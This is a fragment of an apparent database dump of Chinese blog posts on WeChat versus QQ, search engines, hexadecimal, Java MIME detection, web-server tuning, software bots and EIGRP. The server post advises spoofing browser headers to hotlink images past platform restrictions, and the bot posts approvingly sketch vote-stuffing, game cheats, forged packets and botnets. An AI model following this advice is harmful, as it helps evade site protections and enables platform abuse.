Windows上的电脑界面，对此90后都有感受。\r\n\r\n\r\n\r\n\r\n一个新时代的到来，必然伴随着众多中小企业的崩溃或崛起，而大型企业原有的产品也受到巨大冲击。这时，创新是解决矛盾的唯一救命稻草。\r\n\r\n\r\n\r\n\r\n移动互联网时代的到来急速增长了上网人群，部分中老年人也变成了网民。新时代的运行法则骤然转变，再加上一个心理因素：\r\n\r\n\r\n\r\n\r\n◆用户喜新厌旧的心理。\r\n\r\n\r\n\r\n\r\n微信与qq在功能上有很多不同，比如qq账号注册繁琐，而微信很简便；qq注重文本交流，微信侧重音频；微信保证个人隐私而qq不能；qq面向国内用户而微信面向世界。\r\n\r\n\r\n\r\n\r\n总体来说，qq是PC上的杰作而微信完美呈现了移动互联网的特性。\r\n\r\n\r\n\r\n\r\n移动互联网时代的特色有：移动支付平台，企业公众平台，即时通讯平台，好友互动平台，掌上游戏平台，甚至“摇一摇”等传感功能。这些工作在台式机上几乎无法完成。\r\n\r\n\r\n\r\n\r\n虽然从今天角度，qq也可以在手机上做的很成功，但当时微信出现的必然性有两个重要原因：\r\n\r\n\r\n\r\n\r\n依赖性。QQ的成长基因根深蒂固在电脑界面上。\r\n\r\n\r\n\r\n\r\n腾讯qq从最早单一的文字聊天功能，到今天融合了新闻、社交、游戏、综艺、邮件的庞大客户端，其要想很好的移植到全新的移动市场，并符合手机环境，保证用户体验，必定面临“减肥”的需要。但我们都知道增肥容易减肥难啊！更何况减什么，怎么减对于QQ这种级别的软件来说绝对是不小的难题！\r\n\r\n\r\n\r\n\r\n◆人们的思维定式。\r\n\r\n\r\n\r\n\r\n当时一款通讯软件“米聊”的出现给人们一种新鲜感，而用户们的潜意识告诉自己，qq只适用于电脑上，有了智能手机就要用一款全新的应用软件。人们对qq的印象停留在台式机和笔记本上。\r\n\r\n\r\n\r\n\r\n由于qq承载了太多好友和个人信息，人们在添加新朋友的时候回有意识的倾向于这款不同的手机软件。\r\n\r\n\r\n\r\n\r\n于是马化腾全力打造基于手机开发的微信产品，并且凭借腾讯公司的经验和资本，迅速反超了一切竞争者，甚至最终奠定了与qq之间的良性竞争的环境。\r\n\r\n\r\n\r\n\r\n之前也说过，qq的转型很困难，从这一点可以引出最后一个自然规律，那就是：\r\n\r\n\r\n\r\n\r\n◆企业/团队都难逃生命周期中的衰退阶段。产品转型要克服很大阻力。\r\n\r\n\r\n\r\n\r\n自然界万物都不是永恒的，企业产品也难逃此劫。\r\n\r\nQQ历经十余年，形成了庞大体系，似乎已经到达了顶峰，而一个越完整的体系想改变也就越难。微信是个全新的开始，拥有巨大的发展空间。社交软件领域是个巨大的市场，腾讯无法将所有的应用功能全压在qq身上，而微信恰好替其分担许多。相比花里胡哨的qq，微信更受专业人士的青睐。而如果qq在新时代强行转型做手机端，那定会感到心有余力不足，不仅要不少时间，还要克服用户“反改变心理”，因此定会有用户流失。而米聊和微信没有这层包袱，一心一意考虑用户需求和创意即可。\r\n\r\n\r\n\r\n\r\n微信之于QQ的最大优势就在于，面对这个全新的市场，没有任何包袱和“经验”的束缚，可以完全根据自己的理解，专注的针对这一全新的市场，去开发最适合它的产品。\r\n\r\n\r\n\r\n\r\n如今超过70%的互联网流量都来自智能手机端，新的主流造致微信超越qq也就不足为奇了，任何大企业只有不断创新，不断颠覆自己的产品才能在IT界生存下去。作为亚洲地区最大用户群体的移动即时通讯软件，微信之于qq即是最好的佐证。\r\n\r\n \r\n\r\n\r\n\r\n\r\n————————以上为作者原创，转载请私信本人，谢谢——————————\r\n\r\n\r\n\r\n\r\n（只有不断关注行业才能拥有一双慧眼，发现市场的规律）',2123),(42,'浅谈搜索引擎与社会文化','2018-01-27 19:47:56',1,0,8,'[搬家于2018-1-27]\r\n自从我上次的博文《会用这两键,你就是电脑高手了》被百度高分收录以后，我对搜索引擎技术有了全新的认识，更确切说，我对中国社会文化有了更新的理解。\r\n一篇文章的标题非常重要，不仅暗示了文章内容，在当下这个快节奏生活中，标题常常决定了网民是否会点击进入文章。所以文章标题必须独具吸引力才能收获较多的关注，当然这也是web2.0自媒体时代里自我营销的手段之一。\r\n至于如何写出一个有诱惑力的标题也是一门艺术，我想基本上只需要满足老百姓的一些小小需求即可，比如“好色”的需求，或说荷尔蒙需求（文明点说法）和时尚的需求。不知是否发现，只要是有关美女和购物的个人主页总是能吸引众多的听众粉丝。\r\n而关于“会用这两键,你就是电脑高手了”这个标题，则既符合了网友的好奇心又满足了他们“贪图不劳而获”的心理。其实那篇文章是我转载自他人的，但借此让我看出了国民社会文化心理的微妙变化。\r\n当然，这不是一篇批判时事的文章，而是要将这一切纽带牵扯至如今正繁荣发展的搜索引擎技术。搜索引擎虽隶属于IT技术，但在实际部署时却和整个社会文化习惯有千丝万缕的联系，尤其在我们大中华地区，这也是为什么说大多互联网企业其实只是一个文化传媒有限公司。大陆的引擎代表百度公司正是秉承了这种发展理念，将搜索引擎技术开发的淋漓尽致。\r\n也许很多谷粉还在扼腕叹息当年谷歌退出大陆的事变，对此我也表示惋惜：一个优秀的，注重公平与创新，客观与严谨的搜索引擎巨头消失在了天际。并不是说百度搜索哪里不好，毕竟百度是抓住了中国网民的搜索习惯，搜索结果更加大众化，我只是想到那些注重学术严谨和知识共享的学者们而略有不满。\r\n正是中美文化的差异导致谷歌的退出，也证明了谷歌无法超越百度（In\r\nChina）。美国人永远无法掌握“博大精深”的中国文化，也就是不能熟知华人的搜索习惯和实际需求，无法站在大陆人的角度上思考问题。同时，美国人固有坚持的“自由”的执念与中国政府格格不入，这直接造致了其被封杀出境，悲哉。\r\n由此看来，当今搜索引擎的发展趋势就是内容越来越吸引大众。但是行业垄断以后不可避免的引发了服务质量下滑，先是被漫山遍野的三无广告和一些莫名其妙的“生活小贴士”以及各种虚假夸张博眼球的变态新闻给淹没，再就是很罪恶的百度竞价排名。其次，搜索的大部分内容都被百度自研发的平台占据，如百度知道，百度百科，百度经验等（当然这些还是有用的）。\r\n社会发展趋势终究不可避免，再多的“套路”也只是企业的生存发展之道。也许百度搜索委员会才是真正了解大众和市场的一群人，只有夺目的标题，精致的内容修饰，以及成熟的宣传技巧才能让你的作品产品输出得到百度的收录和更多的关注。由此回到了最初的问题，To那些严谨的学术作者和销售，若是一味坚持原来的创作之道，你会发现“志同道合”的客户越来越少，唯有“style转型”（比如在文字中添如些幽默元素）才是长久的应世策略。不仅是标题与名称要响亮诱人，更要为之准备一完整的宣传平台，不惜使用夸张另类甚至低俗的手段。面对万众污浊的大众心理和举世闻名的文化趋势，“自恃清高”已然显得愚蠢，还是坦然面向大众吧！\r\n——2015.12.23',1314),(43,'假如人类使用16进制','2018-01-27 22:06:09',4,0,9,'>又是一篇梦游文,特搬于此以供娱乐\r\n\r\n![00688cvOzy754UYUB7cd2.jpg](http://upload-images.jianshu.io/upload_images/8974305-292325869158a2a1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n 十进制一直是我心中过不去的一道坎。。\r\n\r\n人类社会使用十进制已经几十万年的历史了，追根到底它源于远古智人的手指计数：当十只手指记不下时就会找其他记号标记一个“十”，接着从1开始再次用手指记录，以此循环。当十根可爱的手指头在眼前不停晃动，重复最末位的计数，人们也慢慢习惯上了这种进位方式，代代相传。\r\n\r\n可不幸的是，现代计算机和二进制密不可分。无论是内存地址，硬盘数据，总线信号还是无线电磁波，都遵循着二进制排列组合的规则。因为种种原因，两级对立的普遍性和稳定性存在于这个物质世界的许多地方：晶体管的开与关（内存），电磁的正与负（机械硬盘），电信号的有与无（数据线），波频的高与低（无线网络）。\r\n\r\n十进制与二进制相距甚远，且不是次方关系，这直接造成了许多问题，首当其冲的就是：符号匮乏的二进制想要表示一个文件需要排列组合很长很长一串，最重要的是十进制二进制之间的转换比较麻烦。\r\n\r\n随着大脑进化，人类早就脱离了用手指来记10以下的数量，直接大脑缓存即可，事实上人脑可以轻松驾驭远大于10的进制计算。只是基因和社会化的缘故，导致我们仍然依赖于十进制。\r\n\r\n这些窘境该如何解决呢？在这里有一个“不成熟”的方案蓝图：不改变计算机而去改变人类自己，让人类使用16进制！\r\n\r\n正如之前所说，两极性的普遍实用让二进制和十进制“相爱相杀”，因为两极之间的稳定性和快速切换性无处不在，就像语言学中“正反大小高低强弱”这些普遍支持的衡量概念。计算机历史上曾经有人想挑战这一“盛世哲学”但均无功而返：第一代美国军用计算机利用高能耗的电子管cpu试图实现十进制计算来与人类同步；俄罗斯曾经提出的三进制创想最终化为泡沫。对计算机进制的争议最终还是收敛到无可比拟的二进制。\r\n\r\n为什么人类使用16进制会更好呢？这里有两点原因，第一点原因是为了适应计算机。\r\n\r\n先来说下计算器核心部件的工作逻辑：\r\n\r\n当你从输入设备上依次写入十进制数的每一位之后（注意此时内存中是一个用二进制表示每一位的十进制数），cpu通过算法将它们转化成一个完整的二进制数（通常分配一个4字节的空间用于存储）。之后就开始了二进制数之间的数值运算，也就是经典的逻辑运算实现加减法，加减组成乘除，算出结果后再通过一个二转十进制的算法输出。\r\n\r\n![逻辑电路﻿](http://upload-images.jianshu.io/upload_images/8974305-3a6b48cda186de0d.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n在这个过程中，十与二进制之间的转换计算所消耗的时间要远大于单纯的两个数之间的四则运算，这就是存在的“不合理”之处。\r\n\r\n为解决这个矛盾，聪明的程序猿们提出了模拟竖式计算的“十进制算法”，这种办法直接绕过了数制转换。在内存或缓存中，数是直接以十进制的形式存放的，最终通过每一位十进制数字之间的二进制计算，同时模仿十进制的进位规则，最终得到的结果自然也是十进制的。这种算法还突破了4Byte存储的限制，让计算更灵活。\r\n\r\nBut，仿竖式计算的致命缺陷仍然在存储上，因为至少要用一个字节来存储位数字，可惜一个字节可以表示256个不同数字，运用在十进制上面显然很浪费，即使只用4个比特也也会损失一半以上的资源浪费。可想而知，这种算法只适用于“连续计算但不连续输出”的情况，存储时还得转成二进制，再加上浮点数的负数的限制让这种算法难以大规模使用。\r\n![大整数竖式乘法的核心算法﻿](http://upload-images.jianshu.io/upload_images/8974305-9343a9322433a20d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n说来说去，矛盾的核心还是停留在进制的转换问题上。这时请调用我们灵活的大脑，发挥想象，顺便回到主题“16进制”。众所周知2进制转16进制是相当简便与直接的：一个16进制数字与4位二进制数一一对应，即实现了空间充分利用又大大降低了转换的成本，直接加快了OSI参考模型中“应用层”的执行速度，简直是完美。如果人类从一开始就使用十六进制生活工作，到20世纪伊始又邂逅了可爱的图灵计算机，那么此时的我们将多么受益啊！\r\n\r\n还有，人类最好使用16进制的第二点原因是：有助于人类自己。十进制对于我们的大脑的计算和记忆能力来说过于简单容易了，16进制更丰富的表示能力可以让人们的生活潜移默化地趋向多样化，渗透到我们的语言和文化的种种方面，激发大脑的智力，提升大脑的思考。虽然听起来很抽象，却是个不争的事实，只可惜人类进化史让我们没能长处8根指头，不然这个世界会是个全新的面貌哦。\r\n\r\n所以请容许我提出一个目前看似无法实现的梦想，就是“全民改用16进制”。此愿望若是成真，将是多么大的一个进步啊。可见社会固化并不全是好处，正确的变革还是由少数人完成的哈，也许未来会有越来越多人意识到这一条可持续发展的新方向。\r\n![00688cvOzy754VgUOpLa5.jpg](http://upload-images.jianshu.io/upload_images/8974305-d4bdb73c804482ca.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n',2445),(45,'如何从文件/流的头字节中得到mime信息','2018-01-28 21:11:00',2,1,8,'####抛出一个疑问:OS是如何识别并按照一定编码打开纯文本文件的?\r\n在写网络爬虫的时候，需要根据链接来获取文件类型，将内容正确存储。之前我都是根据链接的后缀来判断的，比如：\r\n\r\n>http://avatar.csdn.net/5/5/E/3_github_38885296.jpg\r\n\r\n这个链接指向的文件就是个jpg文件。但是后来发现有诸如\r\n\r\nhttp://jprice.360buyimg.com/getSkuPriceImgService.action?skuId=1850001109&origin=1&webSite=1&type=1\r\n这样的链接，这招就不灵了。后来谷歌百度了一下也没发现解决办法。后来机缘巧合在Java Network Programming上找到了一个办法：\r\n\r\nURLConnection class provides two static methods to help programs figure out the MIME type of some data; you can use these if the content type just isn\'t available or if you have reason to believe that the content type you\'re given isn\'t correct。\r\n\r\n就是说URLConnection提供了两种方法可以猜测（根据实测结果，这个猜测是相当的准）数据的MIME类型。\r\n\r\n  第一个是：\r\n\r\npublic static String guessContentTypeFromName(String name)\r\n\r\n这个方法根据URL文件部分的后缀名来判断类型，跟之前我的方法一样。这个不能解决上面那个问题。\r\n第二个是：\r\npublic static String guessContentTypeFromStream(InputStream in)\r\n这个方法是根据流的前面几个字节来判断类型，这个就不需要文件后缀名了，完全可以解决上面那个问题。\r\n\r\n测试代码如下：\r\n```java\r\nBufferedInputStream\r\n bis = null;\r\nHttpURLConnection\r\n urlconnection = null;\r\nURL\r\n url = null;        \r\n        url\r\n = new URL(strUrl);\r\n    urlconnection\r\n = (HttpURLConnection) url.openConnection();\r\n    urlconnection.connect();\r\nbis\r\n = new BufferedInputStream(urlconnection.getInputStream());\r\n    System.out.println(\"file\r\n type:\"+HttpURLConnection.guessContentTypeFromStream(bis));\r\n```\r\n\r\n常见的文件头字节对照表如下:\r\n> jpg: 255,216\r\ngif: 71,73\r\nbmp: 66,77\r\npng: 137,80\r\ndoc: 208,207\r\ndocx: 80,75\r\nxls: 208,207\r\nxlsx: 80,75\r\njs: 239,187\r\nswf: 67,87\r\nmp3: 73,68\r\nwma: 48,38\r\nmid: 77,84\r\nrar: 82,97\r\nzip: 80,75\r\nxml: 60,63\r\n\r\n###总结:\r\n#####头字节(特殊类型在中间的特定位置)也叫魔数!\r\n#####魔数还没有形成一个标准,并不需要申请,因为是为自家软件解析文件服务的.\r\n文件头字节信息是一种通用标准,行业默契,可以方便不通的系统交换理解不通的数据,除了媒体文件,文件头还用于区分文本文件的编码信息,注意,编码信息目前并不是存放在文件系统中被OS识别和ftp传递的,虽然我们都很希望实现这一点,但是文件头的规范轻松地解决了这个问题.',1753),(46,'Web服务器优化的一些新思路*','2018-01-29 14:04:23',6,0,32,'> ####作为一个新手(并不是菜鸟,而是像我们这样的学生),维护一个网站往往是一个很头疼的问题,尤其是动态网站,更尤其是用java写的网站.\r\n> ####当网站的吞吐量很小的时候你会发现服务器根本不需要维护,因为几乎没有延迟宕机等bug出现,但是当你的网站源代码达到10M以上时你就要小心了,你的网站随时会崩溃,即使没有ddos.\r\n> ####虽然不是专业的服务器维护人员也不是专业的算法工程师,但是我根据经验总结出了一下几个思路,可以很有效的提高你的网站的可用性.\r\n\r\n##数据库篇\r\n数据库是影响网站可用性的最重要的因素,70%以上的小型网站的宕机问题都是由于数据库崩溃造成的,怎么做呢?\r\n###使用连接池\r\n数据库连接池类似tcp连接,需要消耗时空资源来建立,维护,销毁一个连接,再使用它,但是数据库的访问是位于web服务器架构最底层的dao层,可以说和用户之间没有任何直接联系,而且数据库多连接的初衷是多个数据库访问之间相互隔离,互不干扰,以达到安全的目录,但是对于一个网站整体来说,内部的对象和方法都是相互信任的,甚至可以共享一个数据库连接.\r\n这时候我们还需要为每一个请求,每一个服务,每一个方法维护一个数据库连接对象吗?显然是浪费生命.\r\n\r\n>数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个；释放空闲时间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏。这项技术能明显提高对数据库操作的性能。\r\n\r\n市场上基于java的开源连接池有dbcp,c3p0等比较主流,还有hibernete框架提供了封装好的连接池方法可以使用.\r\n###抛弃数据库\r\n##服务器缓存\r\n即使建立 了数据库连接池,只是节省了数据库连接的开销,但是数据库还是要经受住大量的并发访问.但是为每一个动态网页访问一次数据库真的必要吗??\r\n对于某些实时更新的网站比如某某股票走势图,那实时访问数据库是必须的,但是对于一个相对更静态的网页来说,比如我这个个人博客,里面的文章几乎是几天一更,这个时候就完全没必要浪费数据库资源了,甚至可以把动态网页(jsp)直接重写成静态的(html)文件给用户看,效果是一样的.\r\n但是重写太鲁莽了,我们要做的是缓存以达到更弹性的效果.\r\n经过上面一讲,大家对服务器缓存肯定没有疑惑了,它就是实现了一种对用户透明的一种优化机制,直接上产品吧,在java市场,web缓存发展的还不是很快,但一个主流的产品是OSCACHE,有以下特点:\'\r\n\r\n> 缓存任何对象，你可以不受限制的缓存部分jsp页面或HTTP请求，任何java对象都可以缓存。 拥有全面的API--OSCache\r\n> API给你全面的程序来控制所有的OSCache特性。\r\n> 永久缓存--缓存能随意的写入硬盘，因此允许昂贵的创建（expensive-to-create）数据来保持缓存，甚至能让应用重启。\r\n> 支持集群--集群缓存数据能被单个的进行参数配置，不需要修改代码。\r\n> 缓存记录的过期--你可以有最大限度的控制缓存对象的过期，包括可插入式的刷新策略（如果默认性能不需要时）\r\n\r\n\r\n\"当然了,也可以自己手写\"\r\n\r\n\r\n##浏览器缓存\r\n为啥很多人选择关掉browser缓存啊,这明明是有利于双方的优良机制啊,又不是web前端人员嫉cache如仇..\r\n不过缓存真的对小型服务器很友好,尤其是我们这些在阿里云腾讯云上租的廉价学生机,只有可怜如两三兆的出口带宽,不开启浏览器缓存的话真的是浪费钱,最好把超时时间弄长一点,24小时最好,java代码如下:\r\n\r\n> //设置浏览器缓存30分钟\r\n>  resp.setHeader(\"Cache-Control\", \"public\");  \r\n> resp.setHeader(\"Pragma\", \"Pragma\");   \r\n> resp.setDateHeader(\"expires\",new Date().getTime()+30*60*1000);  \r\n\r\n\r\n##服务器代理\r\n和服务器缓存不一样,代理类似过滤器,但是最好是在新的机器上部署,比如防火墙,好吧,做代理的效果其实就是升级硬件的效果,不过这是一种任务分离的思想,可以显著提高响应速度,亲测有效!\r\n##容器篇\r\n###定期重启\r\n即使JVM的垃圾回收机制再好,总会有残留的内存垃圾,有的是由bug产生的,也有非bug产生的,但是无论如何,建过网站的小伙伴们都有感受,把服务器重启一番,或者把服务器软件重启一下,整个网站神清气爽,速度刷新.所以有了这个思路,也不必纠结于人生三大错觉之一的\"我能管理好内存\"了,重启大法好!\r\n对于linux系统,可以利用crond命令来自动的周期性的重启服务器容器(tomcat):\r\n\r\n> crontab -e 0 0 * * * /usr/local/tomcat/bin/shutdown.sh >>\r\n> /root/reboot_tomcat_log 2>&1 1 0 * * *\r\n> /usr/local/tomcat/bin/startup.sh >> /root/reboot_tomcat_log 2>&1\r\n> crontab -l  systemctl restart crond\r\n\r\n##技巧篇\r\n###能放在客户端计算的任务统统放!\r\n永远不要怀疑JavaScript的计算能力,至少我认为JS的地位是不逊于java的.扯远了,什么叫\"能放在客户端计算的任务统统都放\"呢?就是说有些对于原始数据的处理任务没必要我们服务器端算好了再把上层数据交到浏览器那边显示,什么是原始数据?什么是上层数据?,举几个很简单的栗子:\r\n- 用户想要查看某小组中所有成员的排名信息,GET包发给我们以后,我们真的要给他排好名再返回给它一个列表吗,很显然这是愚蠢的,我们只需要从数据库中提取出并发出这些成员信息给那个用户,让他在浏览器端执行排名操作,最后显示出来.\r\n- 再比如,这个用户又想要\"搜索某博主的某篇文章\",我们真的要为了他进行一次全表扫描吗?impossible,我们都知道检索任务是非常消耗cpu资源的,如果每个人都来扫一遍,服务器肯定崩溃,因此,移至客户端!将原始数据(所有文章的标题)通过ajax给浏览器就行了,或者很多情况客户端已经获得了部分文章标题,ajax只要索要剩下的部分就行,然后计算检索,显示.\r\n\r\n这是一种优秀的优化的思路或者说运维的素养.\r\n\r\n###将静态资源偷偷移植到第三方平台\r\n什么意思呢?对于我们这种尴尬的学生党,买的vps的出口带宽真的很少,基本上1M 1.5M的都有,最多加到3M就吃不消了,同时内存更贵,基本上都买1G的,当然了土豪随意,如果网页里面许多张少则几百k,多则上兆的图片一放,几个用户一访问,容器分分钟原地爆炸,这就很尴尬了,是你的技术不行吗?不是,而是服务器的配置还特么没我的个人电脑配置高(我的笔记本4核16G),这还怎么玩儿...\r\n所以,我们可以借助其他平台来存放我们这些图片啦,视频啦,甚至css等文件,然后通过url取得.像这些第三方平台太多了,就拿云相册服务来说,网易,新浪,BAT,等等等等,数不胜数的其他平台都可以免费上传照片.\r\n要注意的是,对于一些比较严格的平台,你需要做的是修改http头部,把它伪装成一个正常的浏览器访问包,不然这些url可能返回错误的数据,比如新浪博客的图片会返回\"此图片仅供新浪内部用户使用\";网易lofter会直接返回一个403.',3153),(47,'\"机器人\"的层次化划分 (上)','2018-01-29 17:20:42',0,0,8,'#「机器人」的层次化划分\r\n##概述\r\n这里的\"机器人\"不是传统的机器,而是近几年计算机行业很流行的一个词语:\r\n比如:\r\n>\"写一个自动化机器人\"\r\n>生成一个qq机器人\r\n\r\n等等\r\nso指的是软件意义上的机器人,即是一个程序,用于完成特定的任务.\r\n\r\n![s20121010161158832](https://yqfile.alicdn.com/fc343cdac973ce08f98e730752e2738486f1fb39.jpeg)\r\n```\r\n网上机器人只是一种称谓罢了\r\n有很多种类，但万变不离其宗，说白了就是一段自动程序。\r\n例：聊天机器人，通过记录网络上人与人的聊天，组成语言数据库，当你向机器人发问，它自动查找数据库，找到用量最多的回答来回复你。\r\n```\r\n---\r\n然而机器人笔者我根据多年的编写经验决定将它划分为5个层次,即5个类,分别是:\r\n###-5.物理机器人/外部机器人\r\n###-4.应用层机器人/外设级机器人\r\n###-3.脚本/软件层机器人\r\n###-2.系统级机器人\r\n###-1.网络层机器人\r\n\r\n``除此之外,笔者还将对这5层的机器人分别从工作难度,可用性,成本,效率等方面来做一个综合评分,以供大家学习.``\r\n\r\n乍一看不是很好理解,且听我慢慢道来:\r\n##5.物理机器人\r\n![1369666_20143181646766](https://yqfile.alicdn.com/deb6feec6db18e813875d639190c99d95ea75311.jpeg)\r\n\r\n\r\n\r\n\r\n这个最好理解,其实就是看得见摸得着的机器人,比如前两天的新闻说微信\"挑一挑\"游戏呗程序员开挂,视频中展现了两种外挂,其中一个就是通过一个机械装置绑在手指上操控者手指触屏的时间,同时玩家需要不断测量屏幕上两个相邻跳板之间的距离,将原始数据传递给机器.\r\n除此之外,我们还能想想,通过一个物理的机器人,一个器械手臂相关的装置操控着鼠标键盘等输入设备就可以完成一些重复性的任务,将人类的双手和大脑解放.\r\n物理机器人是完全独立于计算机外部的一个存在.制作一个屋里机器人的成本可谓很高,需要一个新的硬件系统和软件系统还有一个输入输出系统(如果你想通过摄像头实时监控画面变化的话),如果再加上AI系统的话费用更是惊人.\r\n但是从可用性的角度,它能完成人能够完成人类能完成的一切任务(前面也提到了AI:软件领域,只要投够了钱,什么都能实现),无论是验证码还是验证码,统统不需要打码平台....\r\n但是从时效性考虑就不行了,比如你想刷票,需要注册10000个账号,你通过几个机械手臂敲敲点点的,恐怕投票结束了还没搞定.\r\n总结一下,物理机器人会越来越流行,随着机械产业越来越廉价,越来越多的外行人士会选择屋里机器人来像程序员一样和机器互动.\r\n##4.应用层机器人\r\n![1_V2G960YJIVNEV8_AQW3L](https://image-store.slidesharecdn.com/0a802cae-68f5-4e52-a203-85cdfde97fdd-original.png)\r\n\r\n应用层指的是狭义上的应用层,即只是在用户接口上做文章的机器人程序,虽然已经到软件层面了.但是真正实现的时候还是在外设级别,也就是独立于计算机主机的机器人输入输出程序.\r\n比如java的<u>ROBOT</u>类就可以实现一个键盘或者鼠标的输入,但是因为还没到系统级,输入的权限很low,随之而来的可用性就很低下.\r\n输出的话不是摄像头而是通过屏幕截取进而用图像处理模块进行分析;或者声卡编程来监听系统音频数据,而不是物理机器人通过麦克风接收声音.\r\n所以相比物理机器人,成本大大降低是它的优点,\r\n应用层机器人的制作难度是5层中最低的,既不需要物理的硬件和驱动也不需要系统级的算法分析,如果是用于网络应用上的机器人的话,这一层也不需要太多的用户--管理员博弈.\r\n总结一下,应用层机器人是大多数程序员选择的自动化工具,书写简单,效率高尚,而且最重要的是能应付几乎一切计算机工作.\r\n',1711),(48,'机器人的层次化划分 (下)','2018-01-29 17:20:42',2,0,10,'##3.软件层机器人\r\n![448_G_1406530210410](https://yqfile.alicdn.com/d0a05dfb3e8128cdc6f86e7de68d3b1ae7fa3367.jpeg)\r\n\r\n这里以浏览器为例:\r\nchrome浏览器通过*console接口*就能对一张网页为所欲为,对于一切客户端的检测机制,比如检查表单是否为空,两次密码是否一致啦,检测是否上传了合适的图片格式,这些只要慢慢研究都能被破解,如图中的seleniumweb自动化软件或者**headless chrome**无界面浏览器等等都可以在保持应用层透明的情况下完成客户端--服务器的交互,当然了这需要特定应用软件保持一定的开源操作.\r\n除此之外一些大的厂商提供了开发者友好的机器人接口,比如腾讯和facebook都提供了机器人接口,让你免去了数据挖局和分析的麻烦.大家可以去尝试一下,真的不难,\r\n宗山所述,5层当中应用软件层机器人的工作效率适中,编写难度也适中!\r\n\r\n##2.系统层机器人\r\n![yestone_HD_1124835113](https://yqfile.alicdn.com/17ce57782c7a6e2d4eca9f5471dc51a97595d771.jpeg)\r\n\r\n如果说上一层机器人是在应用软件之**上**完成的自动化操作,那么系统层就是在软件之**下**来完成一些\"不可描述\"的任务.\r\n就拿windows API来说明把,用户软件向外发送http包或者ftp包都是经过网络模块的,而且总是通过操纵windows网络接口来完成的,那如果我们在上层机器人轻车熟路的情况下,就可以挑战这个更高难度的一层机器人代码:\r\n抛开算法不谈,光是分析系统api就得费好大劲.其实我也没怎么做过系统级机器人,所以我只谈构想:\r\n即使是一个封闭又加密的用户软件,它调用接口的特征还是很明显的;\r\n只要在底层环境上放置一个抓包程序,就能知道这个软件在什么时候什么情况下调用了什么系统函数,然后你通过这些材料,重新书写一个新的适合你自己的开源软件,(当然了需要管理员权限,最好再linux下使用,因为windows即使管理员也不能为所欲为,macos更不用说了),虽然难度很大,但是一旦做出来这些客户端(shan zhai)软件,嘿嘿,可以说是,installed once , fuck the server everywhere .据说很多国内盗版软件就是通过破解系统,底层拦截数据来实现的.\r\n\r\n##1.网络层机器人\r\n\r\n![60a7cb97_f0ec_4a91_be48_2ed5037202ce](https://yqfile.alicdn.com/51d07128012d064d241a2451cdc80b6d9d1df907.png)\r\n终于到了最底层,也是最有挑战但是一旦写出来就能上天的机器人,如题所曰,这是针对网络层的,什么意思?就是这个机器人的输出就是网络层的数据包,它位于操作系统的最底层出口,直接代理(或自建)客户端软件与相关服务器进行数据交互.\r\n特点:\r\n1.维护成本极高\r\n  与其说是人与机器的博弈不如说是人与人之间的游击战.通常写这一层\r\n  需要监听原程序的变化,同时想尽一切办法抑制软件更新.\r\n2.办事效率极高\r\n  如果说第5层机器人的效率低于用户;第3层机器人接近用户的工作效 \r\n  率,那么网络层机器人的效率是远远高于无论是人类还是其他上层脚\r\n  本.\r\n无论是游戏外挂还是什么投票机,最直接最快的方式就是通过伪造数据包来模拟正常用户.再往深处讲的话,网络机器人非常恐怖,黑客通常都需要海量肉鸡的支持,因为一台机器无论是主机资源还是网络地址都有局限性.\r\n虽然网络层机器人效率第一,但是它的挑战也是令很多人望而却步的,比如说需要经常维护,需要经常和网管智斗等等,还有最重要的是要对加密数据的分析,因为是最底层,需要自己书写socket,还要对网络技术有很深的了解,属于那种全能黑客才能驾驭的技术.',1687),(49,'我眼中的EIGRP (上)','2018-02-02 09:55:27',0,0,3,'![](https://image-store.slidesharecdn.com/0887a4b6-887a-4a50-b69c-7204d2960c79-original.jpeg)\r\n\r\n如图，我想采用一种全新的“框架式”教学法，或者叫“盖楼”，旨在利用抽象的外部接口，分类分层地介绍各个机制之间的关系。其实任何学习到最后都是这个样子，比如数学，刚开始你要认识各种数学定理并且证明他们，之后你就能灵活运用这些定理去解决更高层的问题，而不用再去思考那些定理的证明方法，实现“屏蔽底层的复杂度”。如果你学完一个系统的逻辑机制后仍然在担心，会不会发生某一种情况让这个系统故障？呵呵，那只能说你是死记硬背的。\r\n\r\nEIGRP是极少数的几个思科私有协议之一，在时间顺序上介于RIP与OSPF之间。EIGRP本是一款优秀高效的动态路由协议，但它的现状却不乐观：，由于现实因素，全球的园区网、骨干网领域基本上被OSPF，IS-IS和再上面的BGP给垄断了，只剩下地球角落里的一点点企业仍然在使用它。\r\n\r\n不得不说EIGRP有点可怜，因为它本身有着其他协议无法比拟的优点：\r\n\r\n1.隶属于高级距离矢量协议（其实是高于）。它由距离矢量和链路状态两种路由协议混合而成：既像前者那样，与它的邻居交换更新信息；也像后者那样，保存着一个拓扑表。\r\n\r\n2.网络收敛速度于所有协议中最快，出动查询同时保存备份路径，主链路断掉后备份立刻顶上。\r\n\r\n3.能保证99.99%无环路，依赖于可爱的DUAL算法。\r\n\r\n4.支持不等价负载均衡。\r\n\r\n下面正式进入EIGRP原理的系统大厦：\r\n\r\n首先，进化自RIP的EIGRP依然是通过“口口相传”的形式了解到去往每个网段的最佳邻居。注意，这里的寻路原理类似生成树但不同于ospf，与前者的唯一不同在于，一个是线与线之间一个是点到点之间的寻路，而后者是在整个网络的“线路图”中通过dijkstra算法求得最短路径，也就是地图导航中使用的算法。这些区别一定要弄清楚。\r\n\r\n然后提到视角问题。EIGRP开创了“发现邻居”的先河，保留了一份前无古人的邻居表。邻居表中存放着与自己形成邻接关系的邻居，提醒一下，邻居就是物理位置上相邻而邻接指同属一个eigrp域。如果说RIP的视角只局限于每个路由器自身，那么EIGRP的视力可以看到周围所有的邻居设备，从而增强了网络的可靠性和安全性。\r\n\r\n视角范围的大大提升（当然OSPF拥有更大的视角）直接避免了RIP难以避免的“很愚蠢”的环路，即一条链路两端永不停息的来回交换着同一个数据包，就像两个邻居在赌气一般。因为如果在某个网络的更新包中看到邻居的下一跳竟是自己，那么果断扔掉（类比BGP的AS号）。除此之外，EIGRP自己的水品分割和DUAL算法也给这种环路宣告了死刑。\r\n\r\n说到邻居，自然就引入了hello消息。hello消息的三个（也可以是两个）作用是发现、建立和维护邻居关系。由于需要间隔性的维护，hello消息自始至终都一直存在着，占用着一点带宽。邻居